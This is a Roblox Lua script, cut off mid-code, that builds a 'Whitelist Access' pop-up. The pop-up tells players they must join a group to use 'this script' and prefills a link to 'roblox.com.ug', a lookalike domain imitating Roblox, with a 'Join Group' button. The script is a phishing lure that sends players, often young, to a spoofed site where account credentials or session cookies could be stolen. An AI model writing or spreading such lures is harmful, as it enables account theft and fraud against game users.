


-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "WhitelistGUI"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 400, 0, 300)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
mainFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

-- Add rounded corners
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = mainFrame

-- Title
local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, 0, 0, 50)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "Whitelist Access"
title.TextColor3 = Color3.new(1, 1, 1)
title.TextScaled = true
title.Font = Enum.Font.SourceSansBold
title.Parent = mainFrame

-- Description
local description = Instance.new("TextLabel")
description.Name = "Description"
description.Size = UDim2.new(1, -20, 0, 80)
description.Position = UDim2.new(0, 10, 0, 60)
description.BackgroundTransparency = 1
description.Text = "To access this script, you need to join our group.\nEnter the group link below and click join!"
description.TextColor3 = Color3.new(0.8, 0.8, 0.8)
description.TextScaled = true
description.Font = Enum.Font.SourceSans
description.TextWrapped = true
description.Parent = mainFrame

-- Group Link Input
local groupInput = Instance.new("TextBox")
groupInput.Name = "GroupInput"
groupInput.Size = UDim2.new(0.8, 0, 0, 35)
groupInput.Position = UDim2.new(0.1, 0, 0, 150)
groupInput.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
groupInput.BorderSizePixel = 0
groupInput.Text = "https://roblox.com.ug/communities/8100321000/"
groupInput.TextColor3 = Color3.new(1, 1, 1)
groupInput.TextSize = 14
groupInput.Font = Enum.Font.SourceSans
groupInput.Parent = mainFrame

-- Round corners for input
local inputCorner = Instance.new("UICorner")
inputCorner.CornerRadius = UDim.new(0, 6)
inputCorner.Parent = groupInput

-- Join Group Button
local joinButton = Instance.new("TextButton")
joinButton.Name = "JoinButton"
joinButton.Size = UDim2.new(0.35, 0, 0, 40)
joinButton.Position = UDim2.new(0.1, 0, 0, 200)
joinButton.BackgroundColor3 = Color3.new(0, 0.8, 0)
joinButton.BorderSizePixel = 0
joinButton.Text = "Join Group"
joinButton.TextColor3 = Color3.new(1, 1, 1)
joinButton.TextScaled = true
joinButton.Font = Enum.Font.SourceSansBold
joinButton.Parent = mainFrame

-- Round corners for join button
local joinCorner = Instance.new("UICorner")
